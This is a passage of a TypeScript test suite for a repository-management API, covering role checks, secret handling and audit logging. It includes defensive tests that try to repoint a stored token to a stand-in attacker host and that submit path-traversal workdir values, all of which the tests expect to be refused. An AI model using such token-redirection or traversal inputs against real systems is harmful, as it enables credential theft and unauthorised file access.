      );
      return ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: {
          organizationName: 'acme',
          previewConfig,
          repoName: 'widgets',
          teamId: TEAM_ID,
        },
        url: '/api/v1/repositories',
      });
    };

    beforeEach(() => {
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });
    });

    it('requires the shell-authoring role to change a recipe', async () => {
      asTeamMember('LEAD');
      stored(null);
      const res = await patch({ previewConfig: recipe });

      expect(res.statusCode).toBe(403);
      expect(JSON.parse(res.payload).error.code).toBe('PREVIEW_CONFIG_FORBIDDEN');
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });

    it('refuses a recipe whose env looks secret, naming the keys and never the values', async () => {
      asTeamMember('ADMIN');
      stored(null);
      const res = await patch({
        previewConfig: {
          ...recipe,
          env: { DATABASE_URL: 'postgres://app:hunter2-secret@db:5432/app', PORT: '3000' },
        },
      });

      expect(res.statusCode).toBe(400);
      expect(JSON.parse(res.payload).error.code).toBe('PREVIEW_ENV_LOOKS_SECRET');
      expect(res.payload).toContain('DATABASE_URL');
      expect(res.payload).not.toContain('PORT');
      expect(res.payload).not.toContain('hunter2');
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });

    it('stores and audits a team admin change with schema defaults', async () => {
      asTeamMember('ADMIN');
      stored(null);
      const res = await patch({ previewConfig: recipe });
      const update = ctx.mockPrisma.connection.update.mock.calls.at(-1)?.[0] as {
        data: Record<string, unknown>;
      };

      expect(res.statusCode, res.payload).toBe(200);
      expect(update.data.previewConfig).toMatchObject({
        baseUrl: 'http://localhost:3000',
        readyTimeoutMs: 180_000,
      });
      expect(ctx.mockPrisma.configAuditLog.create).toHaveBeenCalledWith({
        data: expect.objectContaining({
          action: 'UPDATE',
          afterJson: { previewConfig: expect.objectContaining({ start: recipe.start }) },
          beforeJson: { previewConfig: null },
          entityId: REPO_ID,
          entityType: 'Connection',
        }),
      });
    });

    it('accepts a recipe while a team admin onboards a git repository', async () => {
      asTeamMember('ADMIN');
      const res = await onboard(recipe);
      const created = ctx.mockPrisma.connection.create.mock.calls.at(-1)?.[0] as {
        data: Record<string, unknown>;
      };

      expect(res.statusCode, res.payload).toBe(201);
      expect(created.data.previewConfig).toMatchObject({
        baseUrl: 'http://localhost:3000',
        readyTimeoutMs: 180_000,
        start: recipe.start,
      });
      expect(ctx.mockPrisma.configAuditLog.create).toHaveBeenCalledWith({
        data: expect.objectContaining({
          action: 'CREATE',
          afterJson: { previewConfig: expect.objectContaining({ start: recipe.start }) },
          entityId: REPO_ID,
          entityType: 'Connection',
        }),
      });
    });

    it('allows an unchanged recipe to be saved without rewriting or auditing it', async () => {
      asTeamMember('LEAD');
      stored({
        ...recipe,
        baseUrl: 'http://localhost:3000',
        readyTimeoutMs: 180_000,
      });
      const res = await patch({ description: 'updated', previewConfig: recipe });
      const update = ctx.mockPrisma.connection.update.mock.calls.at(-1)?.[0] as {
        data: Record<string, unknown>;
      };

      expect(res.statusCode, res.payload).toBe(200);
      expect(update.data).not.toHaveProperty('previewConfig');
      expect(ctx.mockPrisma.configAuditLog.create).not.toHaveBeenCalled();
    });

    it('allows a team admin to clear a recipe and rejects recipes on other connection types', async () => {
      asTeamMember('ADMIN');
      stored(recipe);
      const cleared = await patch({ previewConfig: null });
      expect(cleared.statusCode).toBe(200);
      const update = ctx.mockPrisma.connection.update.mock.calls.at(-1)?.[0] as
        | { data: Record<string, unknown> }
        | undefined;
      expect(update?.data.previewConfig).toBe(DB_NULL);

      stored(null, 'notion');
      const notGit = await patch({ previewConfig: recipe });
      expect(notGit.statusCode).toBe(400);
      expect(ctx.mockPrisma.connection.update).toHaveBeenCalledTimes(1);
    });

    it('requires the target team shell-authoring role when moving a repository with a recipe', async () => {
      const targetTeam = '44444444-4444-4444-8444-444444444444';
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.teamMembership.findUnique.mockImplementation(
        async ({ where }: { where: { userId_teamId: { teamId: string } } }) => ({
          role: where.userId_teamId.teamId === targetTeam ? 'LEAD' : 'LEAD',
          team: { isActive: true },
        })
      );
      ctx.mockPrisma.team.findUnique.mockResolvedValue({ isActive: true, orgId: null });
      stored(recipe);

      const res = await patch({ teamId: targetTeam });
      expect(res.statusCode).toBe(403);
      expect(JSON.parse(res.payload).error.code).toBe('PREVIEW_CONFIG_FORBIDDEN');
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });

    it('validates preview recipe fields at the repository boundary', async () => {
      const invalid = await patch({
        previewConfig: { ...recipe, readyUrl: 'https://example.com' },
      });
      expect(invalid.statusCode).toBe(400);
      expect(ctx.mockPrisma.connection.findUnique).not.toHaveBeenCalled();
    });
  });

  describe('workspace setup', () => {
    const setup = { steps: [{ run: 'yarn install --immutable' }], submodules: true };
    const patch = (payload: Record<string, unknown>) =>
      ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload,
        url: `/api/v1/repositories/${REPO_ID}`,
      });
    const asTeamMember = (role: 'LEAD' | 'ADMIN') => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValue({
        role,
        team: { isActive: true },
      });
    };
    const stored = (value: unknown) =>
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        apiKeyCiphertext: null,
        config: null,
        executorImage: null,
        executorImageBuild: null,
        gateCommands: null,
        githubApiUrl: null,
        githubUrl: null,
        id: REPO_ID,
        installation: null,
        installationId: null,
        organizationName: 'acme',
        previewConfig: null,
        repoName: 'widgets',
        setup: value,
        teamId: TEAM_ID,
        type: 'git_repo',
      });

    beforeEach(() => {
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });
    });

    it('requires the shell-authoring role to change it', async () => {
      asTeamMember('LEAD');
      stored(null);
      const res = await patch({ setup });

      expect(res.statusCode).toBe(403);
      expect(JSON.parse(res.payload).error.code).toBe('REPO_SETUP_FORBIDDEN');
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });

    it('stores and audits a team admin change', async () => {
      asTeamMember('ADMIN');
      stored(null);
      const res = await patch({ setup });
      const update = ctx.mockPrisma.connection.update.mock.calls.at(-1)?.[0] as {
        data: Record<string, unknown>;
      };

      expect(res.statusCode, res.payload).toBe(200);
      expect(update.data.setup).toEqual(setup);
      expect(ctx.mockPrisma.configAuditLog.create).toHaveBeenCalledWith({
        data: expect.objectContaining({
          action: 'UPDATE',
          afterJson: { setup },
          beforeJson: { setup: null },
          entityType: 'Connection',
        }),
      });
    });

    it('lets anyone save an unchanged setup, and refuses an invalid one', async () => {
      asTeamMember('LEAD');
      stored(setup);
      const same = await patch({ setup });
      expect(same.statusCode, same.payload).toBe(200);
      const update = ctx.mockPrisma.connection.update.mock.calls.at(-1)?.[0] as {
        data: Record<string, unknown>;
      };
      expect(update.data).not.toHaveProperty('setup');

      const bad = await patch({ setup: { steps: [{ run: 'x', workdir: '../out' }] } });
      expect(bad.statusCode).toBe(400);
    });
  });

  describe('a stored credential and a changed destination', () => {
    const patch = (payload: Record<string, unknown>) =>
      ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload,
        url: `/api/v1/repositories/${REPO_ID}`,
      });

    /** A Confluence connection holding a token, as the update route loads it. */
    const stored = (overrides: Record<string, unknown> = {}) => ({
      apiKeyCiphertext: Buffer.from('cipher'),
      config: { baseUrl: 'https://acme.atlassian.net', email: 'a@b.com' },
      id: REPO_ID,
      teamId: TEAM_ID,
      type: 'confluence',
      ...overrides,
    });

    it('refuses to send a stored token to another host', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue(stored());

      const res = await patch({
        config: { baseUrl: 'https://collector.attacker.example', email: 'a@b.com' },
      });

      // A LEAD cannot read the stored token, so repointing the row is how they would
      // collect it: the write must not happen at all.
      expect(res.statusCode).toBe(409);
      expect(JSON.parse(res.payload).error.code).toBe('TOKEN_ORIGIN_CHANGE');
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });

    it('refuses clearing the destination, which is the same move in two steps', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue(stored());

      const cleared = await patch({ config: null });

      expect(cleared.statusCode).toBe(409);
      expect(JSON.parse(cleared.payload).error.code).toBe('TOKEN_ORIGIN_CHANGE');
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });

    it('refuses a change that moves the token without touching the URL', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue(
        stored({
          config: { baseUrl: 'https://jira.corp', provider: 'jira' },
          type: 'issue_tracker',
        })
      );

      // Linear's endpoint is fixed, so this sends the Jira token to another service.
      const res = await patch({ config: { baseUrl: 'https://jira.corp', provider: 'linear' } });

      expect(res.statusCode).toBe(409);
      expect(JSON.parse(res.payload).error.code).toBe('TOKEN_ORIGIN_CHANGE');
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });

    it('permits the move when the caller supplies a new token', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue(stored());
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });

      const res = await patch({
        apiToken: 'a-new-token',
        config: { baseUrl: 'https://other.atlassian.net', email: 'a@b.com' },
      });

      expect(res.statusCode).toBe(200);
      expect(ctx.mockPrisma.connection.update).toHaveBeenCalled();
    });

    it('permits the move when the caller clears the stored token', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue(stored());
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });

      const res = await patch({
        apiToken: null,
        config: { baseUrl: 'https://other.atlassian.net', email: 'a@b.com' },
      });

      expect(res.statusCode).toBe(200);
      expect(ctx.mockPrisma.connection.update).toHaveBeenCalled();
    });

    it('permits an edit that keeps the host, and one on a row with no token', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValue(stored());
      ctx.mockPrisma.connection.update.mockResolvedValue({ id: REPO_ID, teamId: TEAM_ID });

      const sameHost = await patch({
        config: { baseUrl: 'https://acme.atlassian.net/wiki', email: 'a@b.com' },
      });
      expect(sameHost.statusCode).toBe(200);

      ctx.mockPrisma.connection.findUnique.mockResolvedValue(stored({ apiKeyCiphertext: null }));
      const noToken = await patch({ config: { baseUrl: 'https://anywhere.example' } });
      expect(noToken.statusCode).toBe(200);
    });
  });

  describe('PATCH /api/v1/repositories/:id', () => {
    it('updates the repository and returns the new row', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValueOnce({ id: REPO_ID, teamId: TEAM_ID });
      ctx.mockPrisma.connection.update.mockResolvedValueOnce({
        description: 'updated',
        id: REPO_ID,
        teamId: TEAM_ID,
      });

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload: { description: 'updated' },
        url: `/api/v1/repositories/${REPO_ID}`,
      });

      expect(res.statusCode).toBe(200);
      expect(JSON.parse(res.payload).data.description).toBe('updated');
      expect(ctx.mockPrisma.connection.update).toHaveBeenCalled();
    });

    describe('PR title format', () => {
      const patchTitle = async (payload: Record<string, unknown>) => {
        ctx.mockPrisma.connection.findUnique.mockResolvedValueOnce({
          id: REPO_ID,
          teamId: TEAM_ID,
          type: 'git_repo',
        });
        ctx.mockPrisma.connection.update.mockResolvedValueOnce({ id: REPO_ID, teamId: TEAM_ID });
        return ctx.app.inject({
          headers: AUTH_HEADER,
          method: 'PATCH',
          payload,
          url: `/api/v1/repositories/${REPO_ID}`,
        });
      };
      const written = (): { prTitleFormat?: unknown; prTitleTemplate?: unknown } =>
        ctx.mockPrisma.connection.update.mock.calls.at(-1)?.[0].data;

      it('stores a format and a trimmed template', async () => {
        const res = await patchTitle({
          prTitleFormat: 'conventional',
          prTitleTemplate: '  [x] {{ticketId}}  ',
        });
        expect(res.statusCode, res.payload).toBe(200);
        expect(written()).toMatchObject({
          prTitleFormat: 'conventional',
          prTitleTemplate: '[x] {{ticketId}}',
        });
      });

      it('clears both with null, and a blank template clears it too', async () => {
        await patchTitle({ prTitleFormat: null, prTitleTemplate: null });
        expect(written()).toMatchObject({ prTitleFormat: null, prTitleTemplate: null });
        await patchTitle({ prTitleTemplate: '   ' });
        expect(written().prTitleTemplate).toBeNull();
      });

      it('leaves both alone when the body does not mention them', async () => {
        await patchTitle({ description: 'x' });
        expect(written().prTitleFormat).toBeUndefined();
        expect(written().prTitleTemplate).toBeUndefined();
      });

      it('refuses a format it does not know', async () => {
        const res = await ctx.app.inject({
          headers: AUTH_HEADER,
          method: 'PATCH',
          payload: { prTitleFormat: 'freeform' },
          url: `/api/v1/repositories/${REPO_ID}`,
        });
        expect(res.statusCode).toBe(400);
        expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
      });
    });

    it('rejects reassignment when governed knowledge exists on the locked repository', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValueOnce({
        apiKeyAuthTag: null,
        apiKeyCiphertext: null,
        apiKeyNonce: null,
        apiKeyVersion: 1,
        id: REPO_ID,
        team: { orgId: 'org-1' },
        teamId: TEAM_ID,
        type: 'git_repo',
      });
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ isActive: true });
      ctx.mockPrisma.knowledgeItem.count.mockResolvedValueOnce(1);
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload: { teamId: '44444444-4444-4444-8444-444444444444' },
        url: `/api/v1/repositories/${REPO_ID}`,
      });
      expect(res.statusCode, res.payload).toBe(409);
      expect(JSON.parse(res.payload).error.code).toBe('KNOWLEDGE_SOURCE_IN_USE');
      expect(ctx.mockPrisma.connection.update).not.toHaveBeenCalled();
    });

    it('returns 404 when the repository does not exist', async () => {
      ctx.mockPrisma.connection.findUnique.mockResolvedValueOnce(null);

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload: { description: 'updated' },
        url: `/api/v1/repositories/${REPO_ID}`,
      });

      expect(res.statusCode).toBe(404);
      expect(JSON.parse(res.payload).error.code).toBe('REPO_NOT_FOUND');
    });

    it('returns 403 for a non-ADMIN who does not lead the repository’s current team', async () => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.connection.findUnique.mockResolvedValueOnce({ id: REPO_ID, teamId: TEAM_ID });
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValueOnce(null);

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload: { description: 'nope' },
        url: `/api/v1/repositories/${REPO_ID}`,
      });

      expect(res.statusCode).toBe(403);
      expect(JSON.parse(res.payload).error.code).toBe('FORBIDDEN');
    });

    it('returns 400 for a malformed :id param', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PATCH',
        payload: { description: 'x' },
        url: '/api/v1/repositories/not-a-uuid',
      });
      expect(res.statusCode).toBe(400);
    });
  });

  describe('POST /api/v1/repositories/:id/setup/pull-request', () => {
    const setup = { steps: [{ run: 'yarn install --immutable' }] };
    const asTeamMember = (role: 'LEAD' | 'ADMIN') => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValue({
        role,
        team: { isActive: true },
      });
    };
    const post = (payload: unknown) =>
      ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: payload as never,
        url: `/api/v1/repositories/${REPO_ID}/setup/pull-request`,
      });

    beforeEach(() => {
      ctx.mockTemporal.startRepoSetupFileProposal.mockReset().mockResolvedValue(undefined);
      ctx.mockTemporal.getRepoSetupFileProposalStatus.mockReset().mockResolvedValue({
        branch: 'auto/setup-yml-1a2b3c4d',
        prNumber: 7,
        prUrl: 'https://github.com/acme/widgets/pull/7',
        status: 'opened',
      });
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        id: REPO_ID,
        teamId: TEAM_ID,
        type: 'git_repo',
      });
    });
    const status = (requestId: string) =>
      ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: `/api/v1/repositories/${REPO_ID}/setup/pull-request/${requestId}`,
      });

    it('queues the pull request for a team admin, answers 202 at once, and audits it', async () => {
      asTeamMember('ADMIN');
      const res = await post({ setup });
      expect(res.statusCode, res.payload).toBe(202);
      const { requestId } = JSON.parse(res.payload).data;
      expect(requestId).toMatch(new RegExp(`^repo-setup-file-${REPO_ID}-[0-9a-f]{16}$`));
      expect(ctx.mockTemporal.startRepoSetupFileProposal).toHaveBeenCalledWith(requestId, {
        connectionId: REPO_ID,
        setup,
      });
      expect(ctx.mockPrisma.configAuditLog.create).toHaveBeenCalledWith({
        data: expect.objectContaining({
          action: 'CREATE',
          afterJson: { setupFilePullRequestRequested: requestId },
        }),
      });
    });

    it('reports the request status to a team admin', async () => {
      asTeamMember('ADMIN');
      const requestId = `repo-setup-file-${REPO_ID}-0123456789abcdef`;
      const res = await status(requestId);
      expect(res.statusCode, res.payload).toBe(200);
      expect(JSON.parse(res.payload).data).toMatchObject({ prNumber: 7, status: 'opened' });
      expect(ctx.mockTemporal.getRepoSetupFileProposalStatus).toHaveBeenCalledWith(requestId);
    });

    it("does not read another repository's request", async () => {
      asTeamMember('ADMIN');
      for (const other of [
        'repo-setup-file-00000000-0000-4000-8000-000000000000-0123456789abcdef',
        `repo-setup-file-${REPO_ID}-nothex`,
        'eng-acme-widgets-1',
      ]) {
        expect((await status(other)).statusCode, other).toBe(404);
      }
      expect(ctx.mockTemporal.getRepoSetupFileProposalStatus).not.toHaveBeenCalled();
    });

    it('refuses a team lead, for the request and its status', async () => {
      asTeamMember('LEAD');
      const res = await post({ setup });
      expect(res.statusCode).toBe(403);
      expect(JSON.parse(res.payload).error.code).toBe('REPO_SETUP_FORBIDDEN');
      expect(ctx.mockTemporal.startRepoSetupFileProposal).not.toHaveBeenCalled();
      expect((await status(`repo-setup-file-${REPO_ID}-0123456789abcdef`)).statusCode).toBe(403);
    });

    it('rejects an invalid definition before starting anything', async () => {
      asTeamMember('ADMIN');
      const res = await post({ setup: { steps: [{ run: 'x', workdir: '../etc' }] } });
      expect(res.statusCode).toBe(400);
      expect(ctx.mockTemporal.startRepoSetupFileProposal).not.toHaveBeenCalled();
    });
  });

  describe('setup secrets', () => {
    const url = (name = '') =>
      `/api/v1/repositories/${REPO_ID}/setup/secrets${name ? `/${name}` : ''}`;
    const updatedAt = new Date('2026-11-06T12:00:00Z');

    beforeEach(() => {
      for (const fn of Object.values(ctx.mockPrisma.repoSetupSecret)) {
        fn.mockReset();
      }
      ctx.mockPrisma.connection.findUnique.mockResolvedValue({
        id: REPO_ID,
        teamId: TEAM_ID,
        type: 'git_repo',
      });
      ctx.mockPrisma.repoSetupSecret.count.mockResolvedValue(0);
      ctx.mockPrisma.repoSetupSecret.findUnique.mockResolvedValue(null);
      ctx.mockPrisma.repoSetupSecret.upsert.mockResolvedValue({
        name: 'NPM_TOKEN',
        updatedAt,
        valueLastFour: 'cdef',
      });
    });

    describe('setup blockers', () => {
      const blockerId = '00000000-0000-4000-8000-000000000099';
      const base = `/api/v1/repositories/${REPO_ID}/setup-blockers`;
      const get = (query = '') =>
        ctx.app.inject({ headers: AUTH_HEADER, method: 'GET', url: `${base}${query}` });
      const dismiss = () =>
        ctx.app.inject({
          headers: AUTH_HEADER,
          method: 'POST',
          url: `${base}/${blockerId}/resolve`,
        });

      beforeEach(() => {
        ctx.mockPrisma.repoSetupBlocker.findMany.mockReset().mockResolvedValue([]);
        ctx.mockPrisma.repoSetupBlocker.updateMany.mockReset().mockResolvedValue({ count: 1 });
      });

      it('lists open blockers newest first with a computed remedy', async () => {
        ctx.mockPrisma.repoSetupBlocker.findMany.mockResolvedValue([
          {
            connectionId: REPO_ID,
            detail: 'missing TOKEN',
            firstSeenAt: updatedAt,
            id: blockerId,
            kind: 'missing_secret',
            lastSeenAt: updatedAt,
            lastWorkflowId: 'workflow',
            occurrences: 2,
            resolvedAt: null,
            step: null,
            subject: 'TOKEN',
          },
        ]);
        const response = await get();
        expect(response.statusCode).toBe(200);
        expect(response.json().blockers[0]).toEqual({
          detail: 'missing TOKEN',
          firstSeenAt: updatedAt.toISOString(),
          id: blockerId,
          kind: 'missing_secret',
          lastSeenAt: updatedAt.toISOString(),
          lastWorkflowId: 'workflow',
          occurrences: 2,
          remedy: "Add secret TOKEN under the repository's setup secrets.",
          resolvedAt: null,
          step: null,
          subject: 'TOKEN',
        });
        expect(ctx.mockPrisma.repoSetupBlocker.findMany).toHaveBeenCalledWith({
          orderBy: { lastSeenAt: 'desc' },
          where: { connectionId: REPO_ID, resolvedAt: null },
        });
      });

      it('returns an empty list', async () => {
        expect((await get()).json()).toEqual({ blockers: [] });
      });

      it('uses the internal remedy for a kind written by a newer worker', async () => {
        ctx.mockPrisma.repoSetupBlocker.findMany.mockResolvedValue([
          {
            connectionId: REPO_ID,
            detail: 'future diagnostic',
            firstSeenAt: updatedAt,
            id: blockerId,
            kind: 'future_kind',
            lastSeenAt: updatedAt,
            lastWorkflowId: null,
            occurrences: 1,
            resolvedAt: null,
            step: null,
            subject: 'future subject',
          },
        ]);
        const response = await get();
        expect(response.statusCode).toBe(200);
        expect(response.json().blockers[0]).toMatchObject({
          kind: 'future_kind',
          remedy: 'Check the workspace setup diagnostics and retry setup.',
        });
      });

      it.each([
        ['true', false],
        ['false', true],
      ])('parses includeResolved=%s', async (value, openOnly) => {
        expect((await get(`?includeResolved=${value}`)).statusCode).toBe(200);
        expect(ctx.mockPrisma.repoSetupBlocker.findMany).toHaveBeenCalledWith({
          orderBy: { lastSeenAt: 'desc' },
          where: { connectionId: REPO_ID, ...(openOnly ? { resolvedAt: null } : {}) },
        });
      });

      it('dismisses only a blocker on this repository and audits it', async () => {
        expect((await dismiss()).statusCode).toBe(204);
        expect(ctx.mockPrisma.repoSetupBlocker.updateMany).toHaveBeenCalledWith({
          data: { resolvedAt: expect.any(Date) },
          where: { connectionId: REPO_ID, id: blockerId },
        });
        expect(ctx.mockPrisma.configAuditLog.create).toHaveBeenCalled();
      });

      it("returns 404 for another connection's blocker", async () => {
        ctx.mockPrisma.repoSetupBlocker.updateMany.mockResolvedValue({ count: 0 });
        expect((await dismiss()).statusCode).toBe(404);
      });

      it('refuses a team lead for reads and dismissals', async () => {
        ctx.authState.role = 'LEAD';
        ctx.authState.sub = 'lead-1';
        ctx.mockPrisma.teamMembership.findUnique.mockResolvedValue({
          role: 'LEAD',
          team: { isActive: true },
        });
        expect((await get()).statusCode).toBe(403);
        expect((await dismiss()).statusCode).toBe(403);
        expect(ctx.mockPrisma.repoSetupBlocker.findMany).not.toHaveBeenCalled();
        expect(ctx.mockPrisma.repoSetupBlocker.updateMany).not.toHaveBeenCalled();
      });
    });

    describe('moving the app preview env into setup secrets', () => {
      const move = () =>
        ctx.app.inject({
          headers: AUTH_HEADER,
          method: 'POST',
          url: `/api/v1/repositories/${REPO_ID}/preview/env-to-secrets`,
        });
      const recipe = {
        env: { API_KEY: 'sk_live_preview_value' },
        readyUrl: 'http://localhost:3000/',
        secrets: ['DB_URL'],
        start: 'npm start',
      };

      it('stores each value encrypted, names it under secrets and drops env', async () => {
        ctx.mockPrisma.connection.findUniqueOrThrow.mockResolvedValue({ previewConfig: recipe });
        ctx.mockPrisma.repoSetupSecret.findMany.mockResolvedValue([{ name: 'DB_URL' }]);
        ctx.mockPrisma.repoSetupSecret.create.mockResolvedValue({});
        ctx.mockPrisma.connection.update.mockResolvedValue({});
        const res = await move();
        expect(res.statusCode).toBe(200);
        expect(res.json().data).toMatchObject({
          moved: ['API_KEY'],
          previewConfig: { secrets: ['DB_URL', 'API_KEY'], start: 'npm start' },
        });
        expect(res.json().data.previewConfig.env).toBeUndefined();
        const created = ctx.mockPrisma.repoSetupSecret.create.mock.calls[0]?.[0] as {
          data: Record<string, unknown>;
        };
        expect(created.data).toMatchObject({ connectionId: REPO_ID, name: 'API_KEY' });
        const written = JSON.stringify([
          created,
          ctx.mockPrisma.connection.update.mock.calls,
          ctx.mockPrisma.configAuditLog.create.mock.calls,
        ]);
        expect(written).not.toContain('sk_live_preview_value');
        expect(res.body).not.toContain('sk_live_preview_value');
      });

      it('refuses the whole move when a name is already a setup secret', async () => {
        ctx.mockPrisma.connection.findUniqueOrThrow.mockResolvedValue({
          previewConfig: { ...recipe, secrets: [] },
        });
        ctx.mockPrisma.repoSetupSecret.findMany.mockResolvedValue([{ name: 'API_KEY' }]);
        const res = await move();
        expect(res.statusCode).toBe(409);
        expect(res.json().error.code).toBe('SETUP_SECRET_EXISTS');
        expect(ctx.mockPrisma.repoSetupSecret.create).not.toHaveBeenCalled();
      });

      it('refuses a recipe with no env', async () => {
        ctx.mockPrisma.connection.findUniqueOrThrow.mockResolvedValue({
          previewConfig: { readyUrl: 'http://localhost:3000/', start: 'npm start' },
        });
        const res = await move();
        expect(res.statusCode).toBe(400);
        expect(res.json().error.code).toBe('NO_PREVIEW_ENV');
      });
    });

    it('lists names and last four characters, never values', async () => {
      ctx.mockPrisma.repoSetupSecret.findMany.mockResolvedValue([
        { name: 'NPM_TOKEN', updatedAt, valueLastFour: 'cdef' },
      ]);
      const res = await ctx.app.inject({ headers: AUTH_HEADER, method: 'GET', url: url() });
      expect(res.statusCode).toBe(200);
      expect(res.json()).toEqual({
        data: [{ lastFour: 'cdef', name: 'NPM_TOKEN', updatedAt: updatedAt.toISOString() }],
      });
      const query = ctx.mockPrisma.repoSetupSecret.findMany.mock.calls[0]?.[0] as {
        select?: Record<string, boolean>;
      };
      expect(Object.keys(query.select ?? {})).not.toContain('valueCiphertext');
    });

    it('stores the value encrypted and audits only the name', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PUT',
        payload: { value: 'npm_secret_abcdef' },
        url: url('NPM_TOKEN'),
      });
      expect(res.statusCode).toBe(200);
      expect(res.json().data).toEqual({
        lastFour: 'cdef',
        name: 'NPM_TOKEN',
        updatedAt: updatedAt.toISOString(),
      });
      const upsert = ctx.mockPrisma.repoSetupSecret.upsert.mock.calls[0]?.[0] as {
        create: Record<string, unknown>;
      };
      expect(upsert.create).toMatchObject({ connectionId: REPO_ID, name: 'NPM_TOKEN' });
      expect(JSON.stringify(upsert)).not.toContain('npm_secret_abcdef');
      const audit = JSON.stringify(ctx.mockPrisma.configAuditLog.create.mock.calls);
      expect(audit).toContain('NPM_TOKEN');
      expect(audit).not.toContain('npm_secret_abcdef');
      expect(res.body).not.toContain('npm_secret_abcdef');
    });

    it('refuses a name that is not an environment variable name', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PUT',
        payload: { value: 'x' },
        url: url('npm-token'),
      });
      expect(res.statusCode).toBe(400);
      expect(ctx.mockPrisma.repoSetupSecret.upsert).not.toHaveBeenCalled();
    });

    it('refuses a new secret past the per-repository limit, but replaces an existing one', async () => {
      ctx.mockPrisma.repoSetupSecret.count.mockResolvedValue(20);
      const refused = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PUT',
        payload: { value: 'value_123456' },
        url: url('ANOTHER'),
      });
      expect(refused.statusCode).toBe(409);
      ctx.mockPrisma.repoSetupSecret.findUnique.mockResolvedValue({ id: 'secret-1' });
      const replaced = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PUT',
        payload: { value: 'value_123456' },
        url: url('NPM_TOKEN'),
      });
      expect(replaced.statusCode).toBe(200);
    });

    it('refuses a team lead who is not a team admin', async () => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-1';
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValue({
        role: 'MEMBER',
        team: { isActive: true },
      });
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PUT',
        payload: { value: 'value_123456' },
        url: url('NPM_TOKEN'),
      });
      expect(res.statusCode).toBe(403);
      expect(ctx.mockPrisma.repoSetupSecret.upsert).not.toHaveBeenCalled();
    });

    it('deletes a secret, and answers 404 for one that is not there', async () => {
      ctx.mockPrisma.repoSetupSecret.deleteMany.mockResolvedValueOnce({ count: 1 });
      const gone = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'DELETE',
        url: url('NPM_TOKEN'),
      });
      expect(gone.statusCode).toBe(204);
      expect(ctx.mockPrisma.repoSetupSecret.deleteMany).toHaveBeenCalledWith({
        where: { connectionId: REPO_ID, name: 'NPM_TOKEN' },
      });
      ctx.mockPrisma.repoSetupSecret.deleteMany.mockResolvedValueOnce({ count: 0 });
      const missing = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'DELETE',
        url: url('NPM_TOKEN'),
      });
      expect(missing.statusCode).toBe(404);
    });

    it('refuses a value shorter than 8 characters', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'PUT',
        payload: { value: '1234567' },
        url: url('PIN'),
      });
      expect(res.statusCode).toBe(400);
      expect(res.body).toContain('at least 8 characters');
      expect(ctx.mockPrisma.repoSetupSecret.upsert).not.toHaveBeenCalled();
    });

    describe('moving only some env values', () => {
      const move = (payload?: Record<string, unknown>) =>
        ctx.app.inject({
          headers: AUTH_HEADER,
          method: 'POST',
          ...(payload ? { payload } : {}),
          url: `/api/v1/repositories/${REPO_ID}/preview/env-to-secrets`,
        });
      const recipe = {
        env: { API_TOKEN: 'tok_value_1234567', PORT: '3000' },
        readyUrl: 'http://localhost:3000/',
        start: 'npm start',
      };

      beforeEach(() => {
        ctx.mockPrisma.connection.findUniqueOrThrow.mockResolvedValue({ previewConfig: recipe });
        ctx.mockPrisma.repoSetupSecret.findMany.mockResolvedValue([]);
